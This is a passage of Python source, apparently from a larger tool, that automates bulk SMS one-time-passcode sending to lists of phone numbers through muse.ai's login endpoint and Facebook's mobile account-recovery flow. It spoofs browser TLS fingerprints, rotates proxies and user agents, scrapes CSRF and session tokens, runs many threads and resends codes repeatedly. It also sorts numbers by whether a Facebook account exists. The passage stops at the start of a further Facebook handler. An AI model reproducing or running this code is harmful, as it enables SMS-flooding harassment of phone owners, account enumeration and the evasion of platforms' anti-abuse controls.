    base_headers = {
        'user-agent': user_agent,
        'accept': '*/*',
        'content-type': 'application/json',
        'origin': 'https://muse.ai',
        'referer': 'https://muse.ai/',
        'x-hatch-waterfall-id': waterfall_id,
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'accept-language': lang_header or 'en-US,en;q=0.9'
    }
    ch_headers = get_browser_ch_headers(user_agent, is_mobile=('Android' in user_agent or 'iPhone' in user_agent))
    if ch_headers:
        base_headers.update(ch_headers)
        base_headers['sec-ch-prefers-color-scheme'] = 'dark'

    impersonate_target = get_impersonate_target(user_agent)
    client = cffi_requests.Session(impersonate=impersonate_target)
    client.verify = False
    if proxy_dict:
        client.proxies.update(proxy_dict)

    try:
        try:
            client.get(
                'https://muse.ai/',
                headers={
                    'user-agent': user_agent,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'accept-language': lang_header or 'en-US,en;q=0.9',
                    **ch_headers
                },
                timeout=20
            )
        except Exception:
            pass

        r_restart = client.post('https://muse.ai/api/auth/native/restart', headers=base_headers, json={}, timeout=25)
        if r_restart.status_code != 201 and r_restart.status_code != 200:
            update_counter('failed', number, f'[Muse] Init failed (HTTP {r_restart.status_code}) [Proxy: {actual_proxy_country}]', RED)
            save_failed_number(number)
            return False

        restart_json = r_restart.json() if r_restart.content else {}
        csrf_token = restart_json.get('csrf_token') or restart_json.get('csrfToken') or ''
        csrf_cookie = client.cookies.get('hatch_native_auth_csrf', '')
        if not csrf_token:
            csrf_token = csrf_cookie or r_restart.headers.get('x-hatch-csrf-token', '')
        if not csrf_token:
            update_counter('failed', number, f'[Muse] Missing CSRF Token [Proxy: {actual_proxy_country}]', RED)
            save_failed_number(number)
            return False

        caa_payload = {
            'events': [
                {
                    'table': 'caa_login_client_events_rl',
                    ' core': {
                        'event_name': 'contactpoint_focus',
                        'event_category': 'contactpoint_page_interaction',
                        'event_flow': 'login_manual',
                        'event_step': 'contactpoint',
                        'extra_client_data': {'is_native': '1'},
                        'waterfall_id': waterfall_id,
                        'client_time_ms': int(time.time() * 1000)
                    }
                }
            ]
        }
        try:
            client.post('https://muse.ai/api/auth/caa-events', headers={**base_headers, 'priority': 'u=4, i'}, json=caa_payload, timeout=15)
        except Exception:
            pass

        send_headers = {
            **base_headers,
            'x-hatch-csrf-token': csrf_token,
            'x-hatch-caa-reg-entry-point': 'login_home',
            'priority': 'u=1, i'
        }
        send_payload = {
            'contact_point': f'+{clean_num}',
            'region': region
        }
        r_send = client.post('https://muse.ai/api/auth/native/send-otp', headers=send_headers, json=send_payload, timeout=25)
        if r_send.status_code in (200, 201):
            send_json = r_send.json() if r_send.content else {}
            state = send_json.get('registration_state', 'otp_sent')
            update_counter(
                'success', number,
                f'[Muse] OTP Sent Successfully! [{state}] [Region: {region}] [UA: {ua_display}] [Proxy: {actual_proxy_country}]',
                GREEN
            )
            save_registered_number(number)
            save_success_number(number)
            if resend_count > 0:
                for r_idx in range(1, resend_count + 1):
                    time.sleep(random.uniform(0.8, 1.5))
                    try:
                        r_resend = client.post('https://muse.ai/api/auth/native/resend-otp', headers=send_headers, json={}, timeout=20)
                        if r_resend.status_code in (200, 201):
                            safe_print(f'{GREEN} {number} [Muse] OTP Resend {r_idx}/{resend_count} Successful! [{actual_proxy_country}]{RESET}')
                        else:
                            safe_print(f'{YELLOW} {number} [Muse] OTP Resend {r_idx}/{resend_count} Failed ({r_resend.status_code}) [{actual_proxy_country}]{RESET}')
                    except Exception as e:
                        safe_print(f'{YELLOW} {number} [Muse] Resend OTP {r_idx} Error: {e} [{actual_proxy_country}]{RESET}')
            return True
        else:
            try:
                err_json = r_send.json()
                err_desc = err_json.get('detail') or err_json.get('title') or r_send.text[:50]
                err_type = err_json.get('type', '')
            except Exception:
                err_desc = r_send.text[:50]
                err_type = ''
            err_lower = str(err_desc).lower()
            if r_send.status_code == 409 or "can't be used to log in" in err_lower or 'exist' in err_lower or 'already' in err_lower:
                update_counter('noacc', number, f'[Muse] Existing Account! Skipping... [Proxy: {actual_proxy_country}]', YELLOW)
                return False
            if 'rate' in err_lower or 'limit' in err_lower or r_send.status_code == 429:
                update_counter('cap', number, f'[Muse] Rate Limited! [Proxy: {actual_proxy_country}]', YELLOW)
            elif r_send.status_code == 500 or 'registrationFailed' in err_type or 'משהו השתבש' in str(err_desc) or 'something went wrong' in err_lower:
                update_counter('failed', number, f'[Muse] Not Eligible / Registration Failed (500) [Proxy: {actual_proxy_country}]', RED)
            else:
                update_counter('failed', number, f'[Muse] Send Failed ({r_send.status_code}): {err_desc}', RED)
            save_failed_number(number)
            return False
    except Exception as e:
        err_str = str(e).lower()
        if 'timeout' in err_str or 'timed out' in err_str:
            update_counter('error', number, f'[Muse] Request timeout! [Proxy: {actual_proxy_country}]', RED)
            save_failed_number(number)
            time.sleep(1)
            return 'RETRY'
        if 'proxy' in err_str or 'connect' in err_str or 'connection' in err_str:
            update_counter('error', number, f'[Muse] Proxy/Connection error: {str(e)[:30]}...', RED)
            save_failed_number(number)
            time.sleep(1)
            return 'RETRY'
        update_counter('error', number, f'[Muse] Unexpected error: {str(e)[:30]}...', RED)
        save_failed_number(number)
        return False
    finally:
        try:
            client.close()
        except Exception:
            pass


def muse_otp_menu():
    clear_logo()
    print(f'\n{GREEN} ✦✦✦ MUSE.AI AUTO OTP SENDER ✦✦✦{RESET}\n')
    numbers = file_input('api_settings')
    if not numbers:
        input(f'{WHITE} Press Enter to exit...')
        return
    ua_func = setup_user_agent('api_settings')
    PROXY_LIST, PROXY_ITERATOR = setup_proxies('api_settings')
    setup_language('api_settings')
    resend_count = setup_otp_resend('api_settings')
    max_workers = setup_threads('api_settings')
    import concurrent.futures
    clear_logo()
    reset_counters()
    original_numbers = list(numbers)
    set_total_numbers(len(original_numbers))
    print(f'{GREEN} [{RED}◆{GREEN}] Service         {EKL} Muse.ai (Native Web Auth)')
    print(f'{GREEN} [{RED}◆{GREEN}] Total Numbers  {EKL} {len(original_numbers)}')
    print(f'{GREEN} [{RED}◆{GREEN}] Threads         {EKL} {max_workers}')
    print(f"{GREEN} [{RED}◆{GREEN}] Proxies         {EKL} {len(PROXY_LIST) if PROXY_LIST else 'None'}")
    print(LINE)
    executor = ThreadPoolExecutor(max_workers=max_workers)
    remaining_numbers = list(original_numbers)
    retry_counts = {num: 0 for num in original_numbers}
    future_to_num = {}
    for num in original_numbers:
        proxy_data = next(PROXY_ITERATOR) if PROXY_ITERATOR else None
        user_agent = ua_func()
        future = executor.submit(process_muse_number, num, user_agent, proxy_data, resend_count)
        future_to_num[future] = num
    try:
        while future_to_num:
            done, _ = concurrent.futures.wait(future_to_num.keys(), return_when=concurrent.futures.FIRST_COMPLETED)
            for future in done:
                n = future_to_num.pop(future)
                try:
                    res = future.result()
                except Exception:
                    res = None
                if res == 'RETRY':
                    attempts = retry_counts.get(n, 0)
                    if attempts < 2:
                        retry_counts[n] = attempts + 1
                        proxy_data = next(PROXY_ITERATOR) if PROXY_ITERATOR else None
                        user_agent = ua_func()
                        new_f = executor.submit(process_muse_number, n, user_agent, proxy_data, resend_count)
                        future_to_num[new_f] = n
                        continue
                with file_lock:
                    if n in remaining_numbers:
                        remaining_numbers.remove(n)
                save_remaining_numbers(remaining_numbers)
    finally:
        executor.shutdown(wait=True)
    display_final_summary(continuous_mode=False)
    input(f'\n{WHITE} Press Enter to return to main menu...')


_FB_LOCALE_MAP = {
    'IT': 'it_IT', 'US': 'en_US', 'GB': 'en_GB', 'DE': 'de_DE', 'FR': 'fr_FR',
    'ES': 'es_LA', 'BR': 'pt_BR', 'IL': 'he_IL', 'SA': 'ar_AR', 'TR': 'tr_TR',
    'NL': 'nl_NL', 'PL': 'pl_PL', 'RU': 'ru_RU', 'JP': 'ja_JP', 'KR': 'ko_KR',
    'IN': 'hi_IN', 'BD': 'bn_BD', 'PK': 'ur_PK', 'ID': 'id_ID', 'TH': 'th_TH',
    'VN': 'vi_VN', 'PH': 'en_PH', 'MY': 'ms_MY', 'SE': 'sv_SE', 'NO': 'no_NO',
    'DK': 'da_DK', 'FI': 'fi_FI', 'PT': 'pt_PT', 'GR': 'el_GR', 'CZ': 'cs_CZ',
    'AT': 'de_AT', 'CH': 'de_CH', 'BE': 'nl_BE', 'IE': 'en_IE', 'MX': 'es_LA',
    'AR': 'es_LA', 'CO': 'es_LA', 'CL': 'es_LA', 'PE': 'es_LA', 'TG': 'fr_FR',
    'CM': 'fr_FR', 'EG': 'ar_AR', 'AE': 'ar_AR', 'DZ': 'ar_AR', 'MA': 'ar_AR',
    'IQ': 'ar_AR', 'KW': 'ar_AR', 'QA': 'ar_AR', 'BH': 'ar_AR', 'OM': 'ar_AR',
    'YE': 'ar_AR', 'JO': 'ar_AR', 'LB': 'ar_AR', 'SY': 'ar_AR', 'SD': 'ar_AR'
}

_mfacebook_cache_lock = threading.Lock()
_mfacebook_session_cache = {}


def get_mfacebook_session(proxy_key, proxy_dict, user_agent, lang_header, is_webview, country_code=None):
    from curl_cffi import requests
    impersonate_target = get_impersonate_target(user_agent)
    session = requests.Session(impersonate=impersonate_target)
    session.verify = False
    if proxy_dict:
        session.proxies.update(proxy_dict)

    fb_locale = _FB_LOCALE_MAP.get(country_code, 'en_US') if country_code else 'en_US'
    session.cookies.set('locale', fb_locale, domain='.facebook.com')

    h_get = {
        'authority': 'm.facebook.com',
        'user-agent': user_agent,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': lang_header or 'en-US,en;q=0.9',
        'accept-encoding': 'gzip, deflate',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        **get_browser_ch_headers(user_agent, is_mobile=True)
    }
    r1 = session.get(f'https://m.facebook.com/login/identify/?ctx=recover&locale={fb_locale}', headers=h_get, timeout=25)
    html = r1.text
    cookies = session.cookies.get_dict()
    datr = cookies.get('datr', '')

    def _extract(patterns, text, default=''):
        for p in patterns:
            m = re.search(p, text)
            if m:
                for g in m.groups():
                    if g:
                        return g
        return default

    lsd = _extract([r'"LSD",\[\],\{"token":"([^"]+)"\}', r'"lsd":"([^"]+)"', r'name="lsd" value="([^"]+)"'], html)
    fb_dtsg = _extract([r'name="fb_dtsg" value="([^"]+)"', r'"dtsg"\s*:\s*\{"token"\s*:\s*"([^"]+)"\}', r'"DTSGInitialData",\[\],\{"token":"([^"]+)"\}'], html)
    rev = _extract([r'"server_revision":(\d+)', r'"__rev"\s*:\s*(\d+)'], html, '1052986228')
    hsi = _extract([r'"hsi":"(\d+)"', r'"__hsi"\s*:\s*"(\d+)"'], html, '7707864257778152385')
    hs = _extract([r'"haste_session":"([^"]+)"', r'"__hs":"([^"]+)"'], html, '20758.HYP:wbloks_caa_pkg.2.1...0')
    bkv = _extract([r'versioning_id:"([a-f0-9]{64})"', r'"__bkv"\s*:\s*"([a-f0-9]{40,})"', r'__bkv=([a-f0-9]{40,})'], html, '3c2a1fb8e5d0947ace12b3f6741092853de814cd35e59546e9a48dadc54952c')
    cd_matches = re.findall(r'[\w\-]{50,}\|arm', html)
    cd = cd_matches[0] if cd_matches else ''
    if not lsd or not cd:
        return None, None, False
    tokens = {
        'lsd': lsd,
        'fb_dtsg': fb_dtsg,
        'rev': rev,
        'hsi': hsi,
        'hs': hs,
        'bkv': bkv,
        'cd': cd,
        'datr': datr,
        '_dyn': _extract([r'"__dyn"\s*:\s*"([^"]+)"'], html, '')
    }
    return session, tokens, False


def process_mfacebook_number(number, user_agent_data, proxy_data=None, resend_count=1, is_dual=False):
    import uuid
    import re
    import time
    import random
    import json

    def notify(status, msg, color=WHITE):
        if is_dual:
            if status == 'success':
                safe_print(f' {GREEN}{number} {msg}{RESET}')
            else:
                safe_print(f' {YELLOW}{number} {msg}{RESET}')
        else:
            update_counter(status, number, msg, color)
            if status in ('failed', 'error'):
                save_failed_number(number)

    if isinstance(user_agent_data, tuple):
        user_agent, ua_name = user_agent_data
        ua_display = format_ua_label(user_agent_data) if not ua_name or ua_name == 'Unknown UA' else ua_name
    else:
        user_agent = user_agent_data
        ua_display = format_ua_label(user_agent)

    number = str(number).strip()
    clean_number = re.sub(r'[^0-9]', '', number)
    if not clean_number:
        notify('failed', 'Invalid phone number', RED)
        return False

    time.sleep(random.uniform(2.0, 8.0))
    if 'Android' not in user_agent:
        selected_mobile = random.choice(ANDROID_CHROME_VERSIONS)
        user_agent, ua_display = selected_mobile[0], selected_mobile[1]

    lang_header, country_code, _ = get_locale_for_proxy(proxy_data, clean_number)
    actual_proxy_country = 'Direct'
    proxy_key = 'direct'
    proxy_dict = None
    if proxy_data:
        if isinstance(proxy_data, dict):
            actual_proxy_country = proxy_data.get('country', 'Proxy')
            proxy_key = proxy_data.get('original') or str(proxy_data.get('proxy'))
            if 'original' in proxy_data:
                proxy_dict = parse_proxy(proxy_data['original'])
            elif 'proxy' in proxy_data:
                proxy_dict = proxy_data['proxy']
            else:
                proxy_dict = proxy_data
        else:
            proxy_key = str(proxy_data)
            proxy_dict = parse_proxy(proxy_key)

    tls_target = get_impersonate_target(user_agent)
    if not is_dual:
        if proxy_dict:
            safe_print(f'{GREEN} 🌐 PROXY [{actual_proxy_country}] [{number}] | UA: {ua_display} | TLS: {tls_target}{RESET}')
        else:
            safe_print(f'{CYAN} 🏠 REAL IP (Direct Connection) [{number}] | UA: {ua_display} | TLS: {tls_target}{RESET}')

    is_webview = 'WebView' in ua_display or 'SCG01' in user_agent
    try:
        session, tokens, _ = get_mfacebook_session(proxy_key, proxy_dict, user_agent, lang_header, is_webview, country_code)
        if not session or not tokens:
            notify('error', '[m.facebook] Failed to initialize session tokens', RED)
            return 'RETRY'

        safe_print(f'{CYAN} [m.facebook] Initialized Fresh Session & Unique Tokens for [{number}]{RESET}')
        lsd = tokens['lsd']
        fb_dtsg = tokens['fb_dtsg']
        rev = tokens['rev']
        hsi = tokens['hsi']
        hs = tokens['hs']
        bkv = tokens['bkv']
        cd = tokens['cd']
        datr = tokens['datr']
        jazoest = calc_jazoest(fb_dtsg or lsd)
        waterfall_id = str(uuid.uuid4())
        fb_locale = _FB_LOCALE_MAP.get(country_code, 'en_US') if country_code else 'en_US'

        post_headers = {
            'authority': 'm.facebook.com',
            'user-agent': user_agent,
            'accept': '*/*',
            'accept-language': lang_header or 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://m.facebook.com',
            'referer': f'https://m.facebook.com/login/identify/?ctx=recover&locale={fb_locale}',
            'accept-encoding': 'gzip, deflate',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            **get_browser_ch_headers(user_agent, is_mobile=True)
        }
        search_query = number if number.startswith('+') else f'+{clean_number}'
        mfb_default_dyn = '7xeUmwlE6XwkEiB4K7oFomgwTxB35oz8h2pxi4Eywdo5u4o1mxy7m1uxuCFQ84K'
        live_dyn = tokens.get('_dyn') or mfb_default_dyn
        _text_input_id = 'jlzd35:93'

        safe_print(f'{CYAN} [m.facebook] Searching Account for [{number}]...{RESET}')

        def build_search_params(q, text_input_id='jlzd35:93'):
            return {
                'params': json.dumps({
                    'server_params': {
                        'event_request_id': str(uuid.uuid4()),
                        'INTERNAL__latency_qpl_marker_id': 36707139,
                        'INTERNAL__latency_qpl_instance_id': int(time.time() * 100000),
                        'device_id': None,
                        'family_device_id': None,
                        'waterfall_id': waterfall_id,
                        'offline_experiment_group': None,
                        'layered_homepage_experiment_group': None,
                        'is_platform_login': 0,
                        'is_from_logged_in_switcher': 0,
                        'is_from_logged_out': 0,
                        'access_flow_version': 'pre_mt_behavior',
                        'login_surface': 'login_home',
                        'login_entry_point': 'logged_out',
                        'context_data': cd
                    },
                    'client_input_params': {
                        'zero_balance_state': '',
                        'search_query': q,
                        'fetched_email_list': [],
                        'fetched_email_token_list': [],
                        'sso_accounts_auth_data': [],
                        'sfdid': '',
                        'text_input_id': text_input_id,
                        'encrypted_msisdn': '',
                        'headers_infra_flow_id': '',
                        'was_headers_prefill_available': 0,
                        'was_headers_prefill_used': 0,
                        'ig_oauth_token': [],
                        'android_build_type': '',
                        'is_whatsapp_installed': 0,
                        'device_network_info': '',
                        'accounts_list': [],
                        'is_oauth_without_permission': 0,
                        'search_screen_type': 'mobile',
                        'ig_vetted_device_nonce': '',
                        'gms_incoming_call_retriever_eligibility': 'client_not_supported',
                        'auth_secure_device_id': '',
                        'blocked_uids': [],
                        'cloud_trust_token': None,
                        'network_bssid': None,
                        'lois_settings': {'lois_token': ''},
                        'aac': ''
                    }
                })
            }

        d_base = {
            '__aaid': '0',
            '__user': '0',
            '__a': '1',
            '__req': '9',
            '__hs': hs,
            'dpr': '3',
            '__ccg': 'EXCELLENT',
            '__rev': rev,
            '__s': generate_s_val(),
            '__hsi': hsi,
            '__dyn': live_dyn,
            'fb_dtsg': fb_dtsg,
            'jazoest': jazoest,
            'lsd': lsd
        }
        r2 = session.post(
            f'https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.caa.ar.search.async&type=action&__bkv={bkv}',
            headers=post_headers,
            data={**d_base, 'params': json.dumps(build_search_params(search_query, _text_input_id))},
            timeout=25
        )
        text2 = r2.text
        cd2_matches = re.findall(r'[\w\-]{50,}\|arm', text2)
        if not cd2_matches:
            r2 = session.post(
                f'https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.caa.ar.search.async&type=action&__bkv={bkv}',
                headers=post_headers,
                data={**d_base, 'params': json.dumps(build_search_params(clean_number, _text_input_id))},
                timeout=25
            )
            text2 = r2.text
            cd2_matches = re.findall(r'[\w\-]{50,}\|arm', text2)

        _live_dyn_r2 = re.search(r'"__dyn"\s*:\s*"([^"]+)"', text2)
        if _live_dyn_r2:
            d_base['__dyn'] = _live_dyn_r2.group(1)
        _tid_match = re.search(r'"text_input_id"\s*:\s*"([^"]+)"', text2)
        if _tid_match:
            _text_input_id = _tid_match.group(1)

        multi_account_signals = [
            'choose your account', 'choose an account', 'select your account',
            'which account is yours', 'multiple accounts', 'multiple_accounts',
            'account_disambiguation', 'caa.ar.multiple_accounts', 'caa.ar.account_selection'
        ]
        if any(sig in text2.lower() for sig in multi_account_signals):
            notify('failed', '[m.facebook] Multiple Accounts Linked (Skipped)', YELLOW)
            return False

        if not cd2_matches or 'search_error_dialog_shown' in text2 or 'find your account' in text2.lower():
            if 'search_error_dialog_shown' in text2:
                notify('failed', '[m.facebook] Account Not Found (Skipped)', YELLOW)
            else:
                notify('failed', '[m.facebook] Unregistered / No account matched (Skipped)', YELLOW)
            return False

        cd2 = cd2_matches[-1]
        current_cd = cd2
        text4 = text2
        if 'caa.ar.initiate_view' not in text2 and 'caa.ar.auth_method' in text2:
            m_screen = re.search(r'\\"BACK\\" \\"([a-z0-9]+:\d+)\\"', text2)
            screen_id = m_screen.group(1) if m_screen else 'jm52g2:3'
            p_auth = {
                'params': json.dumps({
                    'params': json.dumps({
                        'server_params': {
                            'device_id': None,
                            'waterfall_id': waterfall_id,
                            'is_platform_login': 0,
                            'is_from_logged_out': 0,
                            'access_flow_version': 'pre_mt_behavior',
                            'login_surface': 'account_recovery',
                            'login_entry_point': 'account_recovery',
                            'back_nav_action': 'BACK',
                            'INTERNAL_INFRA_screen_id': screen_id,
                            'context_data': cd2
                        },
                        'client_input_params': {
                            'lois_settings': {'lois_token': ''},
                            'zero_balance_state': '',
                            'aac': ''
                        }
                    })
                })
            }
            r3 = session.post(
                f'https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.caa.ar.auth_method&type=app&__bkv={bkv}',
                headers=post_headers,
                data={**d_base, '__req': 'b', 'params': p_auth['params']},
                timeout=25
            )
            text3 = r3.text
            long_tokens = re.findall(r'\\"([A-Za-z0-9_\-]{80,})\\"', text3)
            auth_async_param = ''
            for t in long_tokens:
                if '|arm' not in t:
                    auth_async_param = t
                    break
            cd3_matches = re.findall(r'[\w\-]{50,}\|arm', text3)
            cd3 = cd3_matches[-1] if cd3_matches else cd2
            p_reject = {
                'params': json.dumps({
                    'server_params': {
                        'device_id': None,
                        'auth_method': 'password',
                        'is_auth_method_rejected': 1,
                        'auth_method_async_params': auth_async_param,
                        'INTERNAL__latency_qpl_marker_id': 36707139,
                        'INTERNAL__latency_qpl_instance_id': int(time.time() * 100000),
                        'family_device_id': None,
                        'waterfall_id': waterfall_id,
                        'offline_experiment_group': None,
                        'layered_homepage_experiment_group': None,
                        'is_platform_login': 0,
                        'is_from_logged_in_switcher': 0,
                        'is_from_logged_out': 0,
                        'access_flow_version': 'pre_mt_behavior',
                        'login_surface': 'account_recovery',
                        'login_entry_point': 'account_recovery',
                        'context_data': cd3
                    },
                    'client_input_params': {
                        'zero_balance_state': '',
                        'android_build_type': '',
                        'cloud_trust_token': None,
                        'network_bssid': None,
                        'lois_settings': {'lois_token': ''},
                        'aac': ''
                    }
                })
            }
            r4 = session.post(
                f'https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.caa.ar.auth_method.async&type=action&__bkv={bkv}',
                headers=post_headers,
                data={**d_base, '__req': 'g', 'params': p_reject['params']},
                timeout=25
            )
            text4 = r4.text
            cd4_matches = re.findall(r'[\w\-]{50,}\|arm', text4)
            current_cd = cd4_matches[-1] if cd4_matches else cd3

        _init_screen_match = re.search(r'INTERNAL_INFRA_screen_id["\s:]+([a-z0-9]+:\d+)', text4)
        init_screen_id = _init_screen_match.group(1) if _init_screen_match else 'jm929a:2'
        p_init = {
            'params': json.dumps({
                'params': json.dumps({
                    'server_params': {
                        'device_id': None,
                        'waterfall_id': waterfall_id,
                        'is_platform_login': 0,
                        'is_from_logged_out': 0,
                        'access_flow_version': 'pre_mt_behavior',
                        'login_surface': 'account_recovery',
                        'login_entry_point': 'account_recovery',
                        'back_nav_action': 'BACK',
                        'INTERNAL_INFRA_screen_id': init_screen_id,
                        'context_data': current_cd
                    },
                    'client_input_params': {
                        'lois_settings': {'lois_token': ''},
                        'machine_id': '',
                        'zero_balance_state': '',
                        'aac': ''
                    }
                })
            })
        }
        r5 = session.post(
            f'https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.caa.ar.initiate_view&type=app&__bkv={bkv}',
            headers=post_headers,
            data={**d_base, '__req': 'h', 'params': p_init['params']},
            timeout=25
        )
        text5 = r5.text
        if any(sig in text5.lower() for sig in multi_account_signals):
            notify('failed', '[m.facebook] Multiple Accounts Linked (Skipped)', YELLOW)
            return False
        if 'phone' not in text5.lower() and 'sms' not in text5.lower():
            notify('failed', '[m.facebook] Phone SMS Not Available for this account (Skipped)', YELLOW)
            return False

        m_cd5 = re.search(r'\\"([A-Za-z0-9_\-]{100,}(?:\\\||\|)arm)\\" \([^\)]+\(dkc \\"is_loading\\"\) \(dkc \\"([^"\\]+)\\"\)', text5)
        if m_cd5:
            cd5 = m_cd5.group(1).replace('\\|', '|')
            loading_state = m_cd5.group(2)
        else:
            all_arms = re.findall(r'[\w\-]{50,}\|arm', text5)
            cd5 = all_arms[-1] if all_arms else current_cd
            loading_state = '2;1ki7cfc3a7;0'

        safe_print(f'{CYAN} [m.facebook] Triggering SMS OTP for [{number}]...{RESET}')
        p_otp = {
            'params': json.dumps({
                'server_params': {
                    'device_id': None,
                    'event_request_id': str(uuid.uuid4()),
                    'login_type': 'FB_SSO',
                    'auth_options': ['phone', 'password', 'whatsapp'],
                    'lara_usage': 0,
                    'is_feta_auth_option': 0,
                    'INTERNAL__latency_qpl_marker_id': 36707139,
                    'INTERNAL__latency_qpl_instance_id': int(time.time() * 100000),
                    'family_device_id': None,
                    'waterfall_id': waterfall_id,
                    'offline_experiment_group': None,
                    'layered_homepage_experiment_group': None,
                    'is_platform_login': 0,
                    'is_from_logged_in_switcher': 0,
                    'is_from_logged_out': 0,
                    'access_flow_version': 'pre_mt_behavior',
                    'login_surface': 'account_recovery',
                    'login_entry_point': 'account_recovery',
                    'context_data': cd5,
                    'serialized_states': {'is_loading': loading_state}
                },
                'client_input_params': {
                    'family_device_id': '',
                    'machine_id': '',
                    'zero_balance_state': '',
                    'auth_option': 'phone',
                    'android_build_type': '',
                    'selected_phone_number_index': -1,
                    'selected_xapp_contactpoint_index': -1,
                    'selected_encrypted_bloks_xapp_cp_lookup_data': '',
                    'cloud_trust_token': None,
                    'network_bssid': None,
                    'lois_settings': {'lois_token': ''},
                    'aac': ''
                }
            })
        }
        r6 = session.post(
            f'https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.caa.ar.auth_option_selection.async&type=action&__bkv={bkv}',
            headers=post_headers,
            data={**d_base, '__req': 'n', 'params': p_otp['params']},
            timeout=25
        )
        text6 = r6.text
        if 'initiate_view_code_send_success' in text6 or 'CODE_ENTRY' in text6:
            notify('success', f'OTP Sent via m.facebook CAA (SMS)! [UA: {ua_display}] [Proxy: {actual_proxy_country}]', GREEN)
            save_success_number(number)
            save_registered_number(number)
            if resend_count > 0:
                for r_idx in range(1, resend_count + 1):
                    time.sleep(round(random.uniform(3.0, 5.0), 2))
                    try:
                        safe_print(f'{CYAN} [m.facebook] Attempting Resend {r_idx}/{resend_count} for [{number}]...{RESET}')
                        r_resend = session.post(
                            f'https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.caa.ar.auth_option_selection.async&type=action&__bkv={bkv}',
                            headers=post_headers,
                            data={**d_base, '__req': to_base36(30 + r_idx), 'params': p_otp['params']},
                            timeout=25
                        )
                        if 'initiate_view_code_send_success' in r_resend.text or 'CODE_ENTRY' in r_resend.text:
                            safe_print(f'{GREEN} {number} OTP Resend {r_idx}/{resend_count} Successful! (m.facebook SMS) [{actual_proxy_country}]{RESET}')
                        elif 'sms_drop_toast_shown' in r_resend.text or "We can't send SMS" in r_resend.text:
                            safe_print(f'{YELLOW} {number} Resend {r_idx}/{resend_count} Rate Limited (SMS Cooldown) [{actual_proxy_country}]{RESET}')
                        else:
                            safe_print(f'{YELLOW} {number} Resend {r_idx}/{resend_count} response received [{actual_proxy_country}]{RESET}')
                    except Exception as e_resend:
                        safe_print(f'{YELLOW} {number} Resend error: {e_resend} [{actual_proxy_country}]{RESET}')
            return True
        if 'sms_drop_toast_shown' in text6 or "We can't send SMS" in text6:
            notify('failed', '[m.facebook] SMS Cooldown / Rate Limited by Facebook (Skipped)', RED)
            return False
        if 'generic_error_dialog_shown' in text6 or 'Sorry, something went wrong' in text6:
            err_msg = 'Phone SMS Rejected by Facebook (Skipped)'
        else:
            err_msg = f"SMS trigger failed ({text6[:40].replace(chr(10), ' ')}) (Skipped)"
        notify('failed', f'[m.facebook] {err_msg}', YELLOW)
        return False
    except Exception as e:
        notify('error', f'[m.facebook] Error: {str(e)[:40]}', RED)
        return 'RETRY'


def mfacebook_otp_menu():
    clear_logo()
    print(f'\n{GREEN} ✦✦✦ M.FACEBOOK AUTO OTP SENDER ✦✦✦{RESET}\n')
    numbers = file_input('mfacebook_settings')
    if not numbers:
        input(f'{WHITE} Press Enter to exit...')
        return
    ua_func = setup_user_agent('mfacebook_settings')
    PROXY_LIST, PROXY_ITERATOR = setup_proxies('mfacebook_settings')
    setup_language('mfacebook_settings')
    resend_count = setup_otp_resend('mfacebook_settings')
    max_workers = setup_threads('mfacebook_settings')
    import concurrent.futures
    clear_logo()
    reset_counters()
    _mfacebook_session_cache.clear()
    original_numbers = list(numbers)
    set_total_numbers(len(original_numbers))
    print(f'{GREEN} [{RED}◆{GREEN}] Engine          {EKL} m.facebook CAA Recovery')
    print(f'{GREEN} [{RED}◆{GREEN}] Total Numbers  {EKL} {len(original_numbers)}')
    print(f'{GREEN} [{RED}◆{GREEN}] Threads         {EKL} {max_workers}')
    print(f"{GREEN} [{RED}◆{GREEN}] Proxies         {EKL} {len(PROXY_LIST) if PROXY_LIST else 'None'}")
    print(LINE)
    executor = ThreadPoolExecutor(max_workers=max_workers)
    remaining_numbers = list(original_numbers)
    retry_counts = {num: 0 for num in original_numbers}
    future_to_num = {}
    for num in original_numbers:
        proxy_data = next(PROXY_ITERATOR) if PROXY_ITERATOR else None
        user_agent = ua_func()
        future = executor.submit(process_mfacebook_number, num, user_agent, proxy_data, resend_count)
        future_to_num[future] = num
    try:
        while future_to_num:
            done, _ = concurrent.futures.wait(future_to_num.keys(), return_when=concurrent.futures.FIRST_COMPLETED)
            for future in done:
                n = future_to_num.pop(future)
                try:
                    res = future.result()
                except Exception:
                    res = None
                if res == 'RETRY':
                    attempts = retry_counts.get(n, 0)
                    if attempts < 2:
                        retry_counts[n] = attempts + 1
                        proxy_data = next(PROXY_ITERATOR) if PROXY_ITERATOR else None
                        user_agent = ua_func()
                        new_f = executor.submit(process_mfacebook_number, n, user_agent, proxy_data, resend_count)
                        future_to_num[new_f] = n
                        continue
                with file_lock:
                    if n in remaining_numbers:
                        remaining_numbers.remove(n)
                save_remaining_numbers(remaining_numbers)
    finally:
        executor.shutdown(wait=True)
    display_final_summary(continuous_mode=False)
    input(f'\n{WHITE} Press Enter to return to main menu...')


def process_web_facebook_number(number, user_agent_data, proxy_data=None, resend_count=1):
    import uuid
    import re
    import time
    import random
    import json
    import urllib.parse
    from curl_cffi import requests

    def notify(status, msg, color=WHITE):
        update_counter(status, number, msg, color)
        if status in ('failed', 'error'):
            save_failed_number(number)

    if isinstance(user_agent_data, tuple):
        user_agent, ua_name = user_agent_data
    else:
        user_agent = user_agent_data
        ua_name = format_ua_label(user_agent)

